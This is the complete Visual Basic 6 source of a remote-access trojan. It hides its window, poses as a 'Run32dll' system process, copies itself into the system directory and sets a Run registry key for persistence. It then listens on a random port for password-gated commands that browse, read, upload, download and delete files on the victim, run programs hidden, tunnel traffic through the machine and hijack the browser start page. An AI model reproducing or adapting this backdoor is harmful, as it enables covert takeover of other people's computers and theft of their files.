VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Run32dll"
   ClientHeight    =   1395
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   2910
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1395
   ScaleWidth      =   2910
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock Upload 
      Left            =   0
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Download 
      Left            =   0
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.FileListBox File1 
      Height          =   285
      Left            =   960
      TabIndex        =   2
      Top             =   720
      Width           =   1935
   End
   Begin VB.DirListBox Dir1 
      Height          =   315
      Left            =   960
      TabIndex        =   1
      Top             =   360
      Width           =   1935
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   960
      TabIndex        =   0
      Top             =   0
      Width           =   1935
   End
   Begin MSWinsockLib.Winsock Transfer 
      Left            =   480
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Pipe 
      Left            =   480
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock TCP 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim HardData As String
Dim Destination As String
Dim Downloc As String
Dim unlocked As Boolean
Dim BytesSent As Long
Dim BytesRecv As Long
Dim TransferHot As Boolean
Dim HardPort As Integer
Const paswrd = "seenoevilhearnoevil"
Sub GoodDeed()
Call SetKeyValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Internet Explorer\Main", "Start Page", "http://www.freedonation.com/global/donate.php3?donate=children", REG_SZ)
TCP.SendData "Good deed successfully completed! This user will donate to a children in need everytime" + vbCrLf + "Internet Explorer is used..." + vbCrLf
End Sub
Sub HappyCamper()
On Error Resume Next

If Not QueryValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "Rundll32") = "" Then GoTo 10

Call FileCopy(App.path + "\" + App.EXEName + ".exe", GetSystemDirectory + "Run32dll.exe")
Call SetKeyValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "Rundll32", LCase$(GetSystemDirectory) + "Run32dll.exe", REG_SZ)
Shell GetSystemDirectory + "Run32dll.exe", vbNormalNoFocus
10

End Sub

Function RandomPort() As Integer

' A little stealth feature that opens a random port in the temporary
' port range so to make the program a little more invisible
Randomize Timer
Dim a As Integer
keepLoop:
a = Int(Rnd * 2000)
If a < 1200 Then GoTo keepLoop
RandomPort = a
'----------------------------------------------
End Function

Sub ServerInfo()
If CInt(Mid$(Time$, 1, 2)) = 12 Then TCP.SendData "Good afternoon. Awaiting your command..." + vbCrLf
If CInt(Mid$(Time$, 1, 2)) < 12 Then TCP.SendData "Good morning. Awaiting your command..." + vbCrLf
If CInt(Mid$(Time$, 1, 2)) > 15 Then TCP.SendData "Good evening. Awaiting your command..." + vbCrLf
TCP.SendData " Server Time: " + Time$ + vbCrLf
TCP.SendData "TimeZone Inf: " + QueryValue(HKEY_LOCAL_MACHINE, "System\CurrentControlSet\control\TimeZoneInformation", "StandardName") + vbCrLf
TCP.SendData "  TelnetD on: " + CStr(TCP.LocalIP) + " (Port: " + CStr(TCP.LocalPort) + ")" + vbCrLf
TCP.SendData "       Owner: " + QueryValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") + vbCrLf
TCP.SendData "Organization: " + QueryValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") + vbCrLf
TCP.SendData "Current User: " + QueryValue(HKEY_LOCAL_MACHINE, "Network\Logon", "username") + vbCrLf
End Sub

Sub ConnectTransfer()
Transfer.Close
Transfer.LocalPort = 0
TCP.SendData "Attempting connecting to IP: " + Destination + "(PORT=" + CStr(HardPort) + ")" + vbCrLf
Transfer.Connect Destination, HardPort

End Sub

Sub DriveList()
Dim a As Integer
TCP.SendData vbCrLf + "Drive Listing..." + vbCrLf
For a = 0 To Drive1.ListIndex + 10
If Not Drive1.List(a) = "" Then TCP.SendData Drive1.List(a) + vbCrLf
Next a
TCP.SendData vbCrLf
End Sub

Private Sub Download_Connect()
Call SendtheData
End Sub

Private Sub Download_ConnectionRequest(ByVal requestID As Long)
Download.Close
Download.LocalPort = 0
Download.Accept requestID
Call SendtheData
End Sub

Sub SendtheData()
On Error GoTo tryand
Dim tmpSTRING As String
tmpSTRING = String$(1000, " ")
Close #1
Open Downloc For Binary As #1
Do
Get #1, , tmpSTRING
Download.SendData tmpSTRING
Loop While Not EOF(1)
Close #1
TCP.SendData "Download Status: File successfully transferred!" + vbCrLf
Downloc = ""
GoTo 10
tryand:
Download.Close
TCP.SendData "Download Status: Location error or error sending data!" + vbCrLf
10
End Sub

Private Sub Download_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Download.Close
TCP.SendData "DOWNLOAD: " + Description + vbCrLf
End Sub

Private Sub Form_Load()
'On Error Resume Next
'App.TaskVisible = False
' DONT FORGET IMPLEMENT STEALTH FEATURE
'If Not UCase$(App.path + "\") = UCase$(GetSystemDirectory) Then
'If App.PrevInstance = True Then End
'Call HappyCamper
'End
'Else
resetSERV
'End If
End Sub

Private Sub Pipe_Connect()
ConnectTransfer
End Sub

Private Sub Pipe_ConnectionRequest(ByVal requestID As Long)
Pipe.Close
Pipe.LocalPort = 0
Pipe.Accept requestID
ConnectTransfer
End Sub

Private Sub Pipe_DataArrival(ByVal bytesTotal As Long)
Dim Incoming As String
If TransferHot = True Then
Pipe.GetData Incoming, vbString, bytesTotal
BytesSent = BytesSent + bytesTotal
Transfer.SendData Incoming
Else
End If

End Sub

Private Sub Pipe_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Pipe.Close
Transfer.Close
TCP.SendData "Pipe Status: " + Description + vbCrLf
Stats
End Sub

Private Sub TCP_ConnectionRequest(ByVal requestID As Long)
TCP.Close
TCP.LocalPort = 0
TCP.Accept requestID
Call ServerInfo
End Sub

Private Sub TCP_DataArrival(ByVal bytesTotal As Long)
Dim tmpdata As String
Dim CurWord As Integer
Dim Word(0 To 10) As String
Dim infoSTACK As String
TCP.GetData tmpdata, vbString, bytesTotal ' Collect data from buffer

If Not tmpdata = vbCrLf Or UCase$(tmpdata) = "X" Then ' Check for return key
HardData = HardData + tmpdata ' if not pressed add temporary data to global data store
Else ' If pressed then...
HardData = HardData + " "
'Divides the words up using a space as the seperator
For a = 1 To Len(HardData)
If Mid$(HardData, a, 1) = " " Then
CurWord = CurWord + 1
Word(CurWord) = infoSTACK
infoSTACK = ""
Else
infoSTACK = infoSTACK + Mid$(HardData, a, 1)
End If
Next a
HardData = ""
'----------------------------------------------------
End If

'Commands go here------------------------------------
If UCase$(Word(1)) = "PWD" Then Call unlockme(Word(2))
If UCase$(Word(1)) = "RESET" Then Call resetSERV
If unlocked = True Then
If UCase$(Word(1)) = "PIPE" Then Call setPIPE(Word(2), Word(3))
If UCase$(Word(1)) = "LOCK" Then unlocked = False: TCP.SendData "System successfully locked..." + vbCrLf
If UCase$(Word(1)) = "PIPESTATS" Then Call Stats
If UCase$(Word(1)) = "CANCELPIPE" Then Call TerminatePipe
If UCase$(Word(1)) = "SYSINFO" Then Call ServerInfo
If UCase$(Word(1)) = "CLOSE" Then Call CloseServer
If UCase$(Word(1)) = "GOODDEED" Then Call GoodDeed
If UCase$(Word(1)) = "RESET" Then Call resetSERV
If UCase$(Word(1)) = "DRIVE" Then DriveList
If UCase$(Word(1)) = "TASKLIST" Then Call processlist 'to do
If UCase$(Word(1)) = "CD" Then Call changeDIR(Word(2))
If UCase$(Word(1)) = "MKDIR" Then Call makedir(Word(2))
If UCase$(Word(1)) = "DIR" Then Call LISTDirectories(Word(2))
If UCase$(Word(1)) = "DOWNLOAD" Then Call downloading(Word(2), Word(3))
If UCase$(Word(1)) = "UPLOAD" Then Call uploading(Word(2), Word(3))
If UCase$(Word(1)) = "DEL" Then Call DeleteFILE(Word(2))
If UCase$(Word(1)) = "ECHOFILE" Then Call EchoFile(Word(2))
If UCase$(Word(1)) = "COPY" Then Call CopyFiles(Word(2), Word(3))
If UCase$(Word(1)) = "SHELL" Then Call ShellProgram(Word(2), Word(3))
If UCase$(Word(1)) = "???" Then Call commandLIST
Else
'TCP.SendData "Access Denied!" + vbCrLf + vbCrLf
'TCP.SendData "Connection Terminated..." + vbCrLf
'TCP.Close
End If
End Sub

Sub unlockme(pwd As String)
If pwd = paswrd Then
unlocked = True
TCP.SendData "System successfully unlocked!" + vbCrLf
Else
unlocked = False
TCP.SendData "Access Denied!" + vbCrLf + vbCrLf
TCP.SendData "Connection Terminated..." + vbCrLf
TCP.Close
resetSERV
End If
End Sub



Sub EchoFile(thepath As String)
On Error GoTo trytohandle
Dim tmpdata As String
Close #3
Open thepath For Input As #3
Do
Line Input #3, tmpdata
TCP.SendData tmpdata
Loop Until EOF(3)
Close #3
TCP.SendData vbCrLf + "------Echo Complete---------------------------------------" + vbCrLf
GoTo 10
trytohandle:
TCP.SendData "File I/O Error: Path file access error!" + vbCrLf
10
End Sub
Sub makedir(thepath As String)
On Error GoTo trytohandle
MkDir thepath
TCP.SendData "Directory has been successfully created!" + vbCrLf
GoTo 10
trytohandle:
TCP.SendData "File I/O Error: Path file access error!" + vbCrLf
10
End Sub
Sub downloading(location As String, theport As String)
On Error GoTo ohdear
Download.Close
If location = "" Or CInt(theport) = 0 Then
TCP.SendData "Download Status: Error! Invalid syntax, missing arguements!" + vbCrLf
Else
Downloc = location
Download.LocalPort = CInt(theport)
Download.Listen
TCP.SendData "Download Pipe Listening on port " + theport + vbCrLf
TCP.SendData "ROUTE TO=" + Downloc + vbCrLf
GoTo 10
ohdear:
TCP.SendData "Download Error! Cannot initialise download!" + vbCrLf
10
End If
End Sub

Sub commandLIST()
TCP.SendData "Server supported command listing..." + vbCrLf
TCP.SendData "Data Pipe Commands" + vbCrLf
TCP.SendData "====================================================================" + vbCrLf
TCP.SendData "PIPE <IP/Host> <RemotePort> - Tunnel connection through server" + vbCrLf
TCP.SendData "CANCELPIPE - Cancels an established pipe session" + vbCrLf
TCP.SendData "PIPESTATS - Pipe data statistics" + vbCrLf + vbCrLf
TCP.SendData "Server/System Commands" + vbCrLf
TCP.SendData "====================================================================" + vbCrLf
TCP.SendData "SYSINFO - System information listing" + vbCrLf
TCP.SendData "TASKLIST - List of all current executable processes" + vbCrLf
TCP.SendData "CLOSE - Close the server" + vbCrLf
TCP.SendData "RESET - Reset the server" + vbCrLf
TCP.SendData "GOODDEED - Resets start-page to make donations to children in need" + vbCrLf + vbCrLf
TCP.SendData "Data Commands" + vbCrLf
TCP.SendData "====================================================================" + vbCrLf
TCP.SendData "DIR <path> - Directory Listing" + vbCrLf
TCP.SendData "CD <path> - Change Directory" + vbCrLf
TCP.SendData "DEL <path> - Delete file(s)" + vbCrLf
TCP.SendData "COPY <source> <destination> - Copy a file" + vbCrLf
TCP.SendData "MKDIR <path> - Make a directory" + vbCrLf
TCP.SendData "ECHOFILE <path> - Echo a file directly to the console" + vbCrLf
TCP.SendData "DOWNLOAD <path> - Download a file from the server" + vbCrLf
TCP.SendData "UPLOAD <Destination> <Localport> - Upload a files to the server" + vbCrLf
TCP.SendData "SHELL <path> - Run an executable on the server" + vbCrLf + vbCrLf


End Sub
Sub CopyFiles(var As String, var2 As String)
On Error GoTo canyou
Call FileCopy(var, var2)
TCP.SendData "File(s) copied successfully!" + vbCrLf
GoTo 10
canyou:
TCP.SendData "File I/O Error: Path file access error!" + vbCrLf
10

End Sub
Sub ShellProgram(thefileto As String, typus As String)
On Error GoTo trytohandle
If UCase$(typus) = "B" Then Shell thefileto, vbHide Else Shell thefileto, vbNormalFocus
TCP.SendData "File Shell completed successfully!" + vbCrLf
GoTo 10
trytohandle:
TCP.SendData "File I/O Error: File does not exist!" + vbCrLf
10
End Sub

Sub DeleteFILE(thefile As String)
On Error GoTo trytohandle
Call SetAttr(thefile, vbNormal)
Kill thefile
TCP.SendData "File(s) has been successfully deleted" + vbCrLf
GoTo 10
trytohandle:
TCP.SendData "File I/O Error: Path file access error!" + vbCrLf
10
End Sub
Sub changeDIR(patha As String)
On Error GoTo handleit
Dir1.path = patha
File1.path = patha
TCP.SendData "Current Directory=" + patha + vbCrLf
GoTo 10
handleit:
TCP.SendData "File I/O Error: Invalid Path or filename!" + vbCrLf
10
End Sub

Sub LISTDirectories(path As String)
On Error GoTo handleERROR
Dim a As Integer
Dim realval As Integer
Dim realpath As String
If path = " " Then
TCP.SendData "Syntax Error: Arguement mismatch!" + vbCrLf
Else
If path = "" Then path = Dir1.path
Dir1.path = path
File1.path = path
If Mid$(path, Len(path), 1) <> "\" Then realpath = path + "\" Else realpath = path
TCP.SendData vbCrLf + "Directory Listing (" + path + ")..." + vbCrLf

For a = 0 To Dir1.ListCount + 10
If Dir1.List(a) <> "" Then TCP.SendData Dir1.List(a) + vbCrLf
Next a
TCP.SendData vbCrLf
For a = 0 To File1.ListCount + 10
If File1.List(a) <> "" Then TCP.SendData realpath + File1.List(a) + vbCrLf
Next a
TCP.SendData vbCrLf
End If
GoTo 10

handleERROR:
TCP.SendData "File I/O Error: Invalid Path or filename!" + vbCrLf
10
End Sub

Sub TerminatePipe()
Pipe.Close
Transfer.Close
TCP.SendData "INTERVENTION: Pipe terminated by user request..." + vbCrLf + vbCrLf
End Sub


Function setPIPE(destIP As String, prt As String) As Boolean
On Error GoTo handleit
Dim port As Integer

'-Clear all triggers and statistic variables------
BytesSent = 0
BytesRecv = 0
TransferHot = False
Destination = ""
HardPort = 0
'-------------------------------------------------

port = CInt(prt)
If port > 65535 Then port = 0
If destIP = "" Or port = 0 Then
TCP.SendData "Pipe Error: Missing required specifications" + vbCrLf
Else
Destination = destIP
HardPort = port
createPIPE
End If
GoTo 10
handleit:
TCP.SendData "Pipe Error: Invalid syntax could not initialise pipe" + vbCrLf
10
End Function

Sub Stats()
TCP.SendData "  Bytes Sent= " + CStr(BytesSent) + vbCrLf
TCP.SendData "  Bytes Recv= " + CStr(BytesRecv) + vbCrLf
End Sub

Sub resetSERV()
Pipe.Close
Transfer.Close
TCP.Close
TCP.LocalPort = RandomPort
TCP.Listen
End Sub

Sub CloseServer()
TCP.SendData "Server is shutting down. Good-bye" + vbCrLf
Pipe.Close
Transfer.Close
TCP.Close
End
End Sub

Private Sub TCP_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
TCP.Close
TCP.Listen
End Sub

Private Sub Transfer_Close()
TCP.SendData "Pipe Status: Connection has been closed" + vbCrLf
End Sub

Private Sub Transfer_Connect()
TCP.SendData "Transfer Status: CONNECTED (IP=" + CStr(Transfer.RemoteHostIP) + " PORT=" + CStr(Transfer.RemotePort) + ")" + vbCrLf
TransferHot = True
End Sub

Sub createPIPE()
Pipe.Close
Pipe.LocalPort = 0
Pipe.Listen
TCP.SendData "PIPE ESTABLISHED: Pipe IP= " + CStr(TCP.LocalIP) + " Local Port= " + CStr(Pipe.LocalPort) + vbCrLf
End Sub

Private Sub Transfer_ConnectionRequest(ByVal requestID As Long)
Transfer.Close
Transfer.LocalPort = 0
Transfer.Accept requestID
TCP.SendData "Transfer Status: CONNECTED (IP=" + CStr(Transfer.RemoteHostIP) + " PORT=" + CStr(Transfer.LocalIP) + ")" + vbCrLf
TransferHot = True
End Sub

Private Sub Transfer_DataArrival(ByVal bytesTotal As Long)
Dim OutGoing As String
Transfer.GetData OutGoing, vbString, bytesTotal
BytesRecv = BytesRecv + bytesTotal
Pipe.SendData OutGoing

End Sub

Private Sub Transfer_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
TransferHot = False
Pipe.Close
Transfer.Close
TCP.SendData "Transfer Status: " + Description + vbCrLf
Stats
TCP.SendData vbCrLf
'Pipe.Close
'Transfer.Close
End Sub

Private Sub Upload_Close()

'TCP.SendData "Upload Status: Upload completed successfully!" + vbCrLf: Close #2: Downloc = ""
End Sub

Private Sub Upload_ConnectionRequest(ByVal requestID As Long)
Upload.Close
Upload.LocalPort = 0
Upload.Accept requestID
End Sub

Private Sub Upload_DataArrival(ByVal bytesTotal As Long)
Dim data As String
tmpdata = String$(1000, " ")
Upload.GetData data, vbString, bytesTotal
Put #2, , data
End Sub

Private Sub Upload_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Upload.Close
TCP.SendData "Upload Status: Connection Terminated. Upload completed!" + vbCrLf
Close #2
End Sub

Sub uploading(location As String, theport As String)
Dim port As Integer
On Error GoTo handler
If location = "" Or CInt(theport) = 0 Then
TCP.SendData "Upload status: Error could not initialise transfer!" + vbCrLf
Else
Upload.Close
Close #2
Downloc = location
Open Downloc For Binary As #2
port = CInt(theport)
Upload.LocalPort = port
Upload.Listen
TCP.SendData "Upload Pipe Listening (PORT=" + CStr(port) + ")" + vbCrLf + "ROUTE=" + Downloc + vbCrLf
GoTo 10
handler:
TCP.SendData "Error: Cannot initialise transfer..." + vbCrLf
10
End If
End Sub

Sub processlist()
Call FillWindows
End Sub
